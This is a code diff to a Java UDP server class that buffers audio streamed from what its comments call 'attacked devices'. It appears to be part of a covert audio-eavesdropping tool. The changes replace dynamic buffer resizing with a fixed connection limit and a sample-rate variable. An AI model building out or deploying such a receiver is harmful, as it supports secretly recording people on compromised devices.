@@ -34,27 +34,26 @@ public class ServerThread implements Runnable {
     private DataLine.Info dataLineInfo;
     private FloatControl volumeControl;
 
-    private DatagramSocket serverSocket = null;
+    private DatagramSocket serverSocket;
 
     int ringBufferSize;
     int maxMemorySize;
     int maxConnections;
 
-    int connectionIncreaseCoefficient;
-
     /**
      * Constructor.
      * Initialize max number of connections and calculate the buffer sizes for connections
      * @param maxMemory Maximum memory size that can be used by the thread to pre-record audio.
+     * @param maxConnectionCount Maximum number of connections from attacked devices
      */
-    public ServerThread(int maxMemory) {
+    public ServerThread(int maxMemory, int maxConnectionCount) {
         maxMemorySize = maxMemory * 1000000;
-        maxConnections = 10;
-        ringBufferSize = maxMemorySize / maxConnections; // Reserve the memory for 10 connections
+        maxConnections = maxConnectionCount;
+        ringBufferSize = maxMemorySize;
+
         System.out.println("[-] Buffers size set to: " + ringBufferSize + " B. (~ prerecorded " +
-                ((ringBufferSize) / (2 * 44100)) / 60 + " minutes and " + ((ringBufferSize) / (2 * 44100)) % 60 +
+                ((ringBufferSize) / (2 * sampleRate)) / 60 + " minutes and " + ((ringBufferSize) / (2 * sampleRate)) % 60 +
                 " seconds per connection)");
-        connectionIncreaseCoefficient = 10;
     }
 
     /**
@@ -107,11 +106,10 @@ public class ServerThread implements Runnable {
             String senderID = getSenderID(packet);
 
             if (!connections.containsKey(senderID)) {
-                System.out.println("[-] New connection: " + senderID);
-                if (connections.size() > maxConnections) {
-                    resizeBuffers(false);
+                if(connections.size() < maxConnections){
+                    System.out.println("[-] New connection: " + senderID);
+                    connections.put(senderID, new Connection(senderID, ringBufferSize));
                 }
-                connections.put(senderID, new Connection(senderID, ringBufferSize));
             }
 
             Connection currentConnection = connections.get(senderID);
@@ -146,37 +144,6 @@ public class ServerThread implements Runnable {
     }
 
     /**
-     * Resize the ring buffers of all the connections.
-     *
-     * The initial memory limit must be respected, so:
-     *     => In case there is too much connections, lower the buffer sizes.
-     *     => In case there is too few connections, increase the buffer sizes.
-     *
-     * Buffer size is always altered by the same coefficient:
-     *     size = size * coeff
-     *       or
-     *     size = size / coeff
-     * @param increaseSize Flag saying whether to increase or decrease the size
-     */
-    private void resizeBuffers(boolean increaseSize) {
-        System.out.println("[-] Resizing buffers");
-        if (increaseSize) {
-            maxConnections /= connectionIncreaseCoefficient;
-        } else {
-            if (ringBufferSize <= 1) {
-                System.out.println("Out of allowed memory usage. Please consider deleting some of the connections");
-                return;
-            }
-            maxConnections *= connectionIncreaseCoefficient;
-        }
-        ringBufferSize = maxMemorySize / maxConnections;
-        for (String connectionID : connections.keySet()) {
-            connections.get(connectionID).resizeBuffer(ringBufferSize);
-        }
-        System.out.println("[-] Buffers resized to: " + ringBufferSize + " B. (~" + (ringBufferSize) / (2 * 44100) + " pre-recorded seconds)");
-    }
-
-    /**
      * Remove connection from the list.
      * @param connectionID ID of the connection to be removed
      */
@@ -187,9 +154,6 @@ public class ServerThread implements Runnable {
 
         if (connections.remove(connectionID) != null) {
             System.out.println("[-] Connection " + connectionID + " removed.");
-            if (connections.size() < (maxConnections / connectionIncreaseCoefficient)) {
-                resizeBuffers(true);
-            }
         } else
             System.out.println("[-] Connection does not exist");
     }
